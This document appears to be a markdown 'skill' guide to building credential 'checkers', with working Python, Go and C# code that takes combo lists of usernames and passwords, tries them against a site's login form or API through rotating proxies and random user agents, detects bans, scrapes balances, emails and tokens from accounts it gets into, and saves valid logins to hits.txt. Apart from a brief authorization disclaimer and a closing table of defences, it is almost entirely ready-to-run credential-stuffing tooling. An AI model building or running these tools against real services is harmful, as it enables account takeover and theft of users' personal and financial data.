# Custom Tracker Building — HTTP Checkers, Credential Validators, and Data Extractors

> For authorized security testing, red team operations, and credential-breach validation on owned/authorized infrastructure only.

---

## Overview

A "checker" or "tracker" is a purpose-built HTTP client that validates credentials, monitors state, or extracts data from a specific target's API or web interface. This skill covers the full architecture: HTTP client layer, session management, fingerprinting, proxy integration, rate limiting, module patterns, and Go/C#/Python implementations.

---

## 1. Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                     Checker Architecture                 │
├─────────────────────────────────────────────────────────┤
│  Input Layer      │  Wordlist / combo list / target list │
│  Config Layer     │  Proxy pool, threads, timeouts       │
│  HTTP Client      │  Cookie jar, TLS, redirect control   │
│  Module Layer     │  Login / Extract / Verify modules    │
│  Fingerprint      │  Success/failure/ban/captcha detect  │
│  Output Layer     │  Hits file, stats, live display      │
└─────────────────────────────────────────────────────────┘
```

---

## 2. HTTP Client Foundation

### 2.1 Python — requests Session with Proxy and Retry

```python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import time, random

class CheckerSession:
    def __init__(self, proxy=None, timeout=15, retries=2):
        self.session = requests.Session()
        retry = Retry(total=retries, backoff_factor=0.5,
                      status_forcelist=[429, 500, 502, 503])
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.timeout = timeout

    def get(self, url, **kwargs):
        return self.session.get(url, timeout=self.timeout, **kwargs)

    def post(self, url, **kwargs):
        return self.session.post(url, timeout=self.timeout, **kwargs)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
]
```

### 2.2 C# — HttpClient with Proxy (HttpClientHandler)

```csharp
using System.Net;
using System.Net.Http;

public class CheckerClient : IDisposable
{
    private readonly HttpClient _http;

    public CheckerClient(string? proxyUrl = null, int timeoutSeconds = 15)
    {
        var handler = new HttpClientHandler
        {
            AllowAutoRedirect = false,          // control redirects manually
            UseCookies = true,                  // session cookies
            CookieContainer = new CookieContainer(),
            ServerCertificateCustomValidationCallback = (_, _, _, _) => true  // ignore TLS errors on test targets
        };

        if (proxyUrl is not null)
        {
            handler.Proxy = new WebProxy(proxyUrl, false);
            handler.UseProxy = true;
        }

        _http = new HttpClient(handler)
        {
            Timeout = TimeSpan.FromSeconds(timeoutSeconds)
        };
        _http.DefaultRequestHeaders.UserAgent.ParseAdd(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    }

    public async Task<HttpResponseMessage> GetAsync(string url)
        => await _http.GetAsync(url);

    public async Task<HttpResponseMessage> PostAsync(string url, FormUrlEncodedContent content)
        => await _http.PostAsync(url, content);

    public void Dispose() => _http.Dispose();
}
```

---

## 3. Fingerprinting — Success / Failure / Ban Detection

Every checker must distinguish at minimum four states per attempt:

| State | Meaning | Example Signal |
|---|---|---|
| HIT | Valid credentials | Redirect to /dashboard, presence of "Welcome" or auth cookie |
| FAIL | Invalid credentials | "Invalid password", 401, same-page reload |
| BANNED | IP/account soft-blocked | "Too many attempts", 429, Cloudflare challenge |
| ERROR | Network/target error | Timeout, 500, connection refused |

### 3.1 Response Fingerprinting (Python)

```python
from dataclasses import dataclass
from enum import Enum

class Result(Enum):
    HIT = "HIT"
    FAIL = "FAIL"
    BANNED = "BANNED"
    ERROR = "ERROR"

@dataclass
class CheckResult:
    result: Result
    username: str
    password: str
    extra: dict = None  # balance, name, email extracted from response

def fingerprint(resp, username, password) -> CheckResult:
    """Classify the HTTP response for a login attempt."""
    # BANNED — check first (highest priority)
    if resp.status_code == 429:
        return CheckResult(Result.BANNED, username, password)
    if any(kw in resp.text for kw in ["captcha", "robot", "cf-challenge", "Too many"]):
        return CheckResult(Result.BANNED, username, password)

    # HIT
    if resp.status_code in (302, 301):
        location = resp.headers.get("Location", "")
        if any(p in location for p in ["/dashboard", "/home", "/account", "/profile"]):
            return CheckResult(Result.HIT, username, password)
    if any(kw in resp.text for kw in ["Welcome,", "My Account", "Log out", "Sign out"]):
        return CheckResult(Result.HIT, username, password)
    if "set-cookie" in resp.headers and "auth" in resp.headers["set-cookie"].lower():
        return CheckResult(Result.HIT, username, password)

    # FAIL
    if any(kw in resp.text for kw in ["Invalid", "incorrect", "wrong password",
                                        "authentication failed", "Login failed"]):
        return CheckResult(Result.FAIL, username, password)
    if resp.status_code == 401:
        return CheckResult(Result.FAIL, username, password)

    return CheckResult(Result.ERROR, username, password)
```

### 3.2 Extracting Data on HIT

```python
import re
from bs4 import BeautifulSoup

def extract_account_data(session: CheckerSession, base_url: str) -> dict:
    """After a successful login, scrape account details."""
    resp = session.get(f"{base_url}/account")
    soup = BeautifulSoup(resp.text, "html.parser")
    data = {}

    # Example: extract account balance
    balance_elem = soup.select_one(".account-balance, [data-balance], #balance")
    if balance_elem:
        data["balance"] = balance_elem.text.strip()

    # Email extraction
    email_match = re.search(r'[\w.+-]+@[\w-]+\.[a-zA-Z]{2,}', resp.text)
    if email_match:
        data["email"] = email_match.group(0)

    # Extract CSRF token for further requests
    csrf = soup.select_one("input[name='_token'], input[name='csrf_token']")
    if csrf:
        data["csrf"] = csrf.get("value")

    return data
```

---

## 4. Module Patterns

### 4.1 Login Module

```python
def login_module(session: CheckerSession, base_url: str, username: str, password: str) -> CheckResult:
    # Step 1: GET login page — collect CSRF token
    resp = session.get(f"{base_url}/login")
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = ""
    csrf_elem = soup.select_one("input[name='_token'], input[name='csrf_token'], input[name='authenticity_token']")
    if csrf_elem:
        csrf = csrf_elem.get("value", "")

    # Step 2: POST credentials
    payload = {
        "username": username,
        "password": password,
        "_token": csrf,
        "remember": "1",
    }
    resp2 = session.post(f"{base_url}/login", data=payload, allow_redirects=False)

    # Step 3: Fingerprint
    result = fingerprint(resp2, username, password)

    # Step 4: Extract data if HIT
    if result.result == Result.HIT:
        try:
            result.extra = extract_account_data(session, base_url)
        except Exception:
            pass

    return result
```

### 4.2 API-Based Login Module

```python
def api_login_module(session: CheckerSession, api_base: str, username: str, password: str) -> CheckResult:
    payload = {"email": username, "password": password}
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    try:
        resp = session.post(f"{api_base}/auth/login",
                            json=payload, headers=headers, allow_redirects=False)
        if resp.status_code == 200:
            data = resp.json()
            token = data.get("access_token") or data.get("token")
            if token:
                return CheckResult(Result.HIT, username, password, {"token": token})
        elif resp.status_code == 401:
            return CheckResult(Result.FAIL, username, password)
        elif resp.status_code == 429:
            return CheckResult(Result.BANNED, username, password)
    except Exception as e:
        return CheckResult(Result.ERROR, username, password, {"error": str(e)})
    return CheckResult(Result.FAIL, username, password)
```

---

## 5. Rate Limiting and Concurrency (Python)

```python
import threading
import time
from queue import Queue

class RateLimiter:
    def __init__(self, calls_per_second: float):
        self.min_interval = 1.0 / calls_per_second
        self.last_call = 0.0
        self._lock = threading.Lock()

    def wait(self):
        with self._lock:
            elapsed = time.monotonic() - self.last_call
            wait_time = self.min_interval - elapsed
            if wait_time > 0:
                time.sleep(wait_time)
            self.last_call = time.monotonic()

def worker(queue: Queue, results: list, limiter: RateLimiter,
           base_url: str, proxy_pool: list, lock: threading.Lock):
    while True:
        try:
            username, password = queue.get_nowait()
        except Exception:
            break
        limiter.wait()
        proxy = random.choice(proxy_pool) if proxy_pool else None
        session = CheckerSession(proxy=proxy)
        try:
            result = login_module(session, base_url, username, password)
            with lock:
                results.append(result)
                if result.result == Result.HIT:
                    print(f"[HIT] {username}:{password} | {result.extra}")
                    with open("hits.txt", "a") as f:
                        f.write(f"{username}:{password} | {result.extra}\n")
        except Exception as e:
            with lock:
                results.append(CheckResult(Result.ERROR, username, password, {"error": str(e)}))
        finally:
            queue.task_done()

def run_checker(combo_file: str, base_url: str, proxy_pool: list,
                threads: int = 10, rps: float = 5.0):
    queue = Queue()
    with open(combo_file) as f:
        for line in f:
            line = line.strip()
            if ":" in line:
                u, p = line.split(":", 1)
                queue.put((u, p))

    results = []
    lock = threading.Lock()
    limiter = RateLimiter(rps)
    workers = [threading.Thread(target=worker,
                                args=(queue, results, limiter, base_url, proxy_pool, lock),
                                daemon=True)
               for _ in range(threads)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()
    return results
```

---

## 6. Go Checker Pattern — Goroutines + Rate Limiter

```go
package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"

	"golang.org/x/time/rate"
)

type Result struct {
	Username string
	Password string
	Status   string // HIT, FAIL, BANNED, ERROR
	Extra    string
}

func newClient(proxyURL string) *http.Client {
	transport := &http.Transport{}
	if proxyURL != "" {
		proxy, _ := url.Parse(proxyURL)
		transport.Proxy = http.ProxyURL(proxy)
	}
	return &http.Client{
		Transport:     transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       15000000000, // 15s in nanoseconds
	}
}

func attempt(client *http.Client, baseURL, username, password string) Result {
	form := url.Values{"username": {username}, "password": {password}}
	resp, err := client.PostForm(baseURL+"/login", form)
	if err != nil {
		return Result{username, password, "ERROR", err.Error()}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	switch {
	case resp.StatusCode == 429:
		return Result{username, password, "BANNED", ""}
	case resp.StatusCode == 302 && strings.Contains(resp.Header.Get("Location"), "dashboard"):
		return Result{username, password, "HIT", resp.Header.Get("Set-Cookie")}
	case strings.Contains(bodyStr, "Welcome"):
		return Result{username, password, "HIT", ""}
	case strings.Contains(bodyStr, "Invalid") || resp.StatusCode == 401:
		return Result{username, password, "FAIL", ""}
	default:
		return Result{username, password, "ERROR", fmt.Sprintf("status=%d", resp.StatusCode)}
	}
}

func main() {
	baseURL := "https://target.example.com"
	comboFile := "combos.txt"
	proxyFile := "proxies.txt"
	numWorkers := 20
	rps := 10.0

	// Load proxies
	proxies := []string{""}
	if f, err := os.Open(proxyFile); err == nil {
		scanner := bufio.NewScanner(f)
		proxies = []string{}
		for scanner.Scan() {
			if p := strings.TrimSpace(scanner.Text()); p != "" {
				proxies = append(proxies, p)
			}
		}
		f.Close()
	}

	// Load combos
	type combo struct{ u, p string }
	jobs := make(chan combo, 1000)
	go func() {
		f, _ := os.Open(comboFile)
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			parts := strings.SplitN(scanner.Text(), ":", 2)
			if len(parts) == 2 {
				jobs <- combo{parts[0], parts[1]}
			}
		}
		close(jobs)
		f.Close()
	}()

	limiter := rate.NewLimiter(rate.Limit(rps), int(rps))
	hits, _ := os.OpenFile("hits.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		proxyURL := proxies[i%len(proxies)]
		client := newClient(proxyURL)
		go func() {
			defer wg.Done()
			for job := range jobs {
				limiter.Wait(nil)
				r := attempt(client, baseURL, job.u, job.p)
				mu.Lock()
				fmt.Printf("[%s] %s:%s %s\n", r.Status, r.Username, r.Password, r.Extra)
				if r.Status == "HIT" {
					fmt.Fprintf(hits, "%s:%s | %s\n", r.Username, r.Password, r.Extra)
				}
				mu.Unlock()
			}
		}()
	}

	wg.Wait()
	hits.Close()
}
```

---

## 7. Unique Token Extraction — Session Pattern Fingerprinting

```python
import re

def extract_unique_tokens(resp_text: str) -> dict:
    """Extract tokens, nonces, and session identifiers from page source."""
    tokens = {}

    # CSRF tokens
    for pattern in [
        r'<input[^>]+name=["\']_token["\'][^>]+value=["\']([^"\']+)["\']',
        r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
        r'"csrfToken":"([^"]+)"',
        r'csrf_token\s*=\s*["\']([^"\']+)["\']',
    ]:
        m = re.search(pattern, resp_text, re.IGNORECASE)
        if m:
            tokens["csrf"] = m.group(1)
            break

    # Bearer token / JWT in page
    jwt_match = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', resp_text)
    if jwt_match:
        tokens["jwt"] = jwt_match.group(0)

    # Nonce
    nonce_match = re.search(r'"nonce"\s*:\s*"([^"]+)"', resp_text)
    if nonce_match:
        tokens["nonce"] = nonce_match.group(1)

    return tokens
```

---

## 8. C# — High-Performance Checker with SemaphoreSlim

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

public class Checker
{
    private readonly string _baseUrl;
    private readonly string[] _proxies;
    private readonly SemaphoreSlim _semaphore;
    private int _hits, _fails, _errors, _banned;
    private readonly object _lock = new();

    public Checker(string baseUrl, string[] proxies, int concurrency = 20)
    {
        _baseUrl = baseUrl;
        _proxies = proxies.Length > 0 ? proxies : new[] { "" };
        _semaphore = new SemaphoreSlim(concurrency);
    }

    public async Task RunAsync(string comboFile)
    {
        var lines = await File.ReadAllLinesAsync(comboFile);
        var tasks = new List<Task>();

        foreach (var line in lines)
        {
            var parts = line.Split(':', 2);
            if (parts.Length != 2) continue;
            var (user, pass) = (parts[0], parts[1]);

            await _semaphore.WaitAsync();
            tasks.Add(Task.Run(async () =>
            {
                try { await CheckAsync(user, pass); }
                finally { _semaphore.Release(); }
            }));
        }

        await Task.WhenAll(tasks);
        Console.WriteLine($"Done: {_hits} hits, {_fails} fails, {_banned} banned, {_errors} errors");
    }

    private async Task CheckAsync(string username, string password)
    {
        var proxy = _proxies[Random.Shared.Next(_proxies.Length)];
        using var client = new CheckerClient(proxy.Length > 0 ? proxy : null);

        try
        {
            var loginPage = await client.GetAsync($"{_baseUrl}/login");
            var html = await loginPage.Content.ReadAsStringAsync();
            var csrf = ExtractCsrf(html);

            var form = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("username", username),
                new KeyValuePair<string, string>("password", password),
                new KeyValuePair<string, string>("_token", csrf),
            });

            var resp = await client.PostAsync($"{_baseUrl}/login", form);
            var body = await resp.Content.ReadAsStringAsync();
            var location = resp.Headers.Location?.ToString() ?? "";

            string status;
            if ((int)resp.StatusCode == 429 || body.Contains("Too many"))
                status = "BANNED";
            else if (resp.StatusCode == System.Net.HttpStatusCode.Found && location.Contains("dashboard"))
                status = "HIT";
            else if (body.Contains("Welcome") || body.Contains("My Account"))
                status = "HIT";
            else if (body.Contains("Invalid") || resp.StatusCode == System.Net.HttpStatusCode.Unauthorized)
                status = "FAIL";
            else
                status = "ERROR";

            lock (_lock)
            {
                switch (status)
                {
                    case "HIT":
                        _hits++;
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[HIT] {username}:{password}");
                        File.AppendAllText("hits.txt", $"{username}:{password}\n");
                        break;
                    case "BANNED": _banned++; break;
                    case "FAIL": _fails++; break;
                    default: _errors++; break;
                }
                Console.ResetColor();
            }
        }
        catch (Exception ex)
        {
            lock (_lock) { _errors++; }
        }
    }

    private static string ExtractCsrf(string html)
    {
        var m = System.Text.RegularExpressions.Regex.Match(
            html, @"name=[""']_token[""'][^>]+value=[""']([^""']+)[""']");
        return m.Success ? m.Groups[1].Value : "";
    }
}
```

---

## 9. Output and Stats

```python
import sys
import time

class Stats:
    def __init__(self):
        self.hits = self.fails = self.errors = self.banned = self.total = 0
        self.start = time.monotonic()
        self._lock = threading.Lock()

    def update(self, result: CheckResult):
        with self._lock:
            self.total += 1
            match result.result:
                case Result.HIT:    self.hits += 1
                case Result.FAIL:   self.fails += 1
                case Result.BANNED: self.banned += 1
                case _:             self.errors += 1
            self._print()

    def _print(self):
        elapsed = time.monotonic() - self.start
        cpm = int(self.total / elapsed * 60) if elapsed > 0 else 0
        sys.stdout.write(
            f"\r[{self.total}] HIT={self.hits} FAIL={self.fails} "
            f"BAN={self.banned} ERR={self.errors} CPM={cpm}    "
        )
        sys.stdout.flush()
```

---

## 10. Hardening the Target Side (Defender Perspective)

| Attack vector | Mitigation |
|---|---|
| Credential stuffing | Rate limit per IP + per account; CAPTCHA after 3 failures |
| Fast combo checking | Account lockout (5 attempts / 10 min); exponential backoff |
| Proxy rotation bypass | Device fingerprinting; behavior analytics |
| Session token extraction | Short-lived tokens; SameSite=Strict cookies; CSRF double-submit |
| Parallel workers | Connection-rate limits per IP at edge (Cloudflare, nginx) |

---

## References

- golang.org/x/time/rate: https://pkg.go.dev/golang.org/x/time/rate
- requests: https://docs.python-requests.org/
- HttpClient (.NET): https://learn.microsoft.com/en-us/dotnet/api/system.net.http.httpclient
- SecLists credential wordlists: https://github.com/danielmiessler/SecLists/tree/master/Passwords
